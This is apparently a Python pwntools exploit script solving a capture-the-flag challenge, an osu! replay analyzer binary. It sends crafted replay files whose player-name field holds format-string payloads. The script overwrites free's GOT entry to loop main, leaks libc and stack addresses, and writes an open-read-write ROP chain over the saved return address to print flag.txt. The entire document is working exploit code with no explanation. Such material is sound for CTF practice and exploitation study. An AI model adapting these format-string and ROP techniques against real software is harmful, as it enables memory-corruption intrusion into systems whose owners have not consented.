from pwn import *

context.arch = 'amd64'
# Set the log level to debug to see all the I/O
context.log_level = 'info' # Change to 'debug' for more verbosity
context.arch = 'amd64'

elf = ELF('./analyzer_patched')
libc = ELF('./libc.so.6')

if 'REMOTE' in args:
    r = remote('miss-analyzer-v2.challs.sekai.team', 1337)
else:
    r = process(elf.path)

gdb.attach(r, """
b *main+1185
continue
""")


printf_got = elf.got['printf']
free = elf.got['free']

def write_byte(value):
    return struct.pack('B', value)

def write_int(value):
    return struct.pack('<I', value)

def write_short(value):
    return struct.pack('<H', value)

def write_string(s):
    """Write osu! replay string format"""
    result = b''
    
    if not s:
        result += b'\x00'
    else:
        result += b'\x0b'  # String indicator
        
        # Convert string to bytes if needed
        if isinstance(s, str):
            s = s.encode()
        elif not isinstance(s, bytes):
            s = bytes(s)
        
        # Write variable-length integer for string length
        length = len(s)
        while length >= 0x80:
            result += bytes([(length & 0x7f) | 0x80])
            length >>= 7
        result += bytes([length & 0x7f])
        
        # Write the actual string
        result += s
    
    return result

def build_payload(payload):
    replay = b''  
    # Game mode (1 byte) - 0 = osu!
    replay += write_byte(0)
    # Version (4 bytes)
    replay += write_int(20)
    # Beatmap hash (string)
    replay += write_string('a'*19)
    # Player name (string) - THIS IS WHERE OUR PAYLOAD GOES
    replay += write_string(payload)
    # Replay hash (string)
    replay += write_string('b' * 2)
    # Score statistics (10 bytes)
    replay += write_short(0)  # 300s
    replay += write_short(0)  # 100s
    replay += write_short(0)  # 50s
    replay += write_short(0)  # Gekis
    replay += write_short(0)  # Katus
    # Miss count (2 bytes)
    replay += write_short(5)
    return replay


write_offset = 16

# overwrite
hex_payload = build_payload(fmtstr_payload(write_offset, {free: elf.symbols['main']})).hex().encode()

r.sendline(hex_payload)

r.recvuntil(b"\nMiss")

hex_payload = build_payload("%p."*30).hex().encode()

r.sendline(hex_payload)
#bullshit here
r.recvuntil("Player name: ")
leaks = r.recvuntil(b"\nMiss").split(b".")
print(leaks)

libc_leak = int(leaks[2], 16) - 1132791
libc.address = libc_leak

stack_leak = int(leaks[0], 16) 

log.info("libc base @ " + hex(libc_leak))
log.info("stack leak @ " + hex(stack_leak))


log.info("rip leak @ " + hex(stack_leak + 8088))
saved_rip_addr = stack_leak + 8088

# Get ROP gadgets
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.success(f"pop rdi; ret @ {hex(pop_rdi)}")
log.success(f"pop rsi; ret @ {hex(pop_rsi)}")
log.success(f"pop rdx; pop rbx; ret @ {hex(pop_rdx_rbx)}")
log.success(f"pop rax; ret @ {hex(pop_rax)}")
log.success(f"syscall; ret @ {hex(syscall_ret)}")

# Stage 3: Write "./flag.txt" string to BSS
bss_addr = elf.bss(0x800)  # Get a writable BSS address with offset
flag_str = bss_addr + 0x100
read_buf = bss_addr + 0x200

log.info(f"BSS @ {hex(bss_addr)}")
log.info(f"Flag string @ {hex(flag_str)}")
log.info(f"Read buffer @ {hex(read_buf)}")

# Write "./flag.txt\x00" (11 bytes total)
flag_filename = b"./flag.txt\x00"
writes_flag = {
    flag_str: u64(flag_filename[0:8]),      # "./flag.t"
    flag_str + 8: u64(flag_filename[8:].ljust(8, b'\x00'))  # "xt\x00"
}

payload = fmtstr_payload(write_offset, writes=writes_flag, write_size='short')
log.info(f"Stage 3: Writing filename (payload size: {len(payload)} bytes)")
hex_payload = build_payload(payload).hex().encode()
r.sendline(hex_payload)
r.recvuntil(b"\nMiss")

# Stage 4: Write ORW ROP chain to stack in CHUNKS
log.info("Stage 4: Writing ORW ROP chain in chunks...")

rop_chain = [
    # open("./flag.txt", O_RDONLY, 0)
    pop_rdi, flag_str,
    pop_rsi, 0,  # O_RDONLY
    pop_rdx_rbx, 0, 0,
    pop_rax, 2,  # SYS_open
    syscall_ret,

    # read(fd=3, buf=read_buf, count=0x100)
    pop_rdi, 3,  # fd (usually 3)
    pop_rsi, read_buf,
    pop_rdx_rbx, 0x100, 0,
    pop_rax, 0,  # SYS_read
    syscall_ret,

    # write(stdout=1, buf=read_buf, count=0x100)
    pop_rdi, 1,  # stdout
    pop_rsi, read_buf,
    pop_rdx_rbx, 0x100, 0,
    pop_rax, 1,  # SYS_write
    syscall_ret,
]

log.info(f"ROP chain has {len(rop_chain)} gadgets")

# Write ROP chain in chunks to avoid massive format strings
CHUNK_SIZE = 3  # Write 3 gadgets at a time
for chunk_idx in range(0, len(rop_chain), CHUNK_SIZE):
    chunk = rop_chain[chunk_idx:chunk_idx + CHUNK_SIZE]
    writes = {}

    for i, gadget in enumerate(chunk):
        target_addr = saved_rip_addr + (chunk_idx + i) * 8
        writes[target_addr] = gadget

    payload = fmtstr_payload(write_offset, writes=writes, write_size='short')
    log.info(f"Writing chunk {chunk_idx//CHUNK_SIZE + 1} (payload: {len(payload)} bytes)")

    hex_payload = build_payload(payload).hex().encode()
    r.sendline(hex_payload)
    r.recvuntil(b"\nMiss")

log.success("ROP chain written! Triggering by exiting loop...")

# Send one more to trigger return
r.sendline(build_payload(b"TRIGGER").hex().encode())
r.interactive()